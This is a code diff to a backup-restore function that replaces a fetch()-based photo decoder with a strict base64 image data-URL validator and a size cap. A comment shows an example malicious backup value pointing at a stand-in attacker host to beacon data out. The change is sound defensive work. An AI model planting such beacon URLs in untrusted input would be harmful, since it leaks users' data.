@@ -81,9 +81,33 @@ function blobToDataUrl(blob: Blob): Promise<string> {
 	});
 }
 
-async function dataUrlToBlob(dataUrl: string): Promise<Blob> {
-	// fetch() decodes a data: URL without any manual base64 juggling.
-	return await (await fetch(dataUrl)).blob();
+// Restore decodes photos by hand instead of handing the string to fetch().
+// fetch() resolves ANY scheme, so a backup carrying
+//   "dataUrl": "https://attacker.example/beacon?d=..."
+// turned a restore into a real outbound request — in an app whose privacy
+// policy states that nothing ever leaves the device, and which ships no CSP
+// to catch it. A backup file is untrusted input: it can be edited by hand or
+// arrive from anywhere, so the scheme is now proven, not assumed.
+const PHOTO_DATA_URL = /^data:image\/(png|jpeg|webp);base64,([A-Za-z0-9+/]+={0,2})$/;
+
+// Photos are downscaled to a 1280px long edge before storage (tins/photo.ts),
+// which lands well under 1 MB; 8 MB is generous headroom that still refuses a
+// file crafted to exhaust memory during decode.
+const MAX_PHOTO_BYTES = 8 * 1024 * 1024;
+
+// Exported for its own tests: this is the trust boundary for photo bytes
+// arriving in a backup file, so it is worth pinning directly rather than only
+// through restoreBackup().
+export function dataUrlToBlob(dataUrl: string): Blob {
+	const m = PHOTO_DATA_URL.exec(dataUrl.trim());
+	if (!m) throw new Error('Photo is not a base64 image data URL.');
+	const [, subtype, b64] = m;
+	// Size-gate from the base64 length (4 chars per 3 bytes) BEFORE allocating.
+	if ((b64.length * 3) / 4 > MAX_PHOTO_BYTES) throw new Error('Photo exceeds the size cap.');
+	const bin = atob(b64); // throws on malformed base64
+	const bytes = new Uint8Array(bin.length);
+	for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
+	return new Blob([bytes], { type: `image/${subtype}` });
 }
 
 const isLive = (row: { deletedAt?: string }) => !row.deletedAt;
@@ -237,7 +261,7 @@ export async function restoreBackup(data: unknown): Promise<RestoreResult> {
 				res.photosKept++;
 				continue;
 			}
-			await repository.setTinPhotoAt(p.tinId, await dataUrlToBlob(p.dataUrl), incomingTs);
+			await repository.setTinPhotoAt(p.tinId, dataUrlToBlob(p.dataUrl), incomingTs);
 			res.photos++;
 		} catch (err) {
 			if (isQuota(err)) throw new QuotaError();
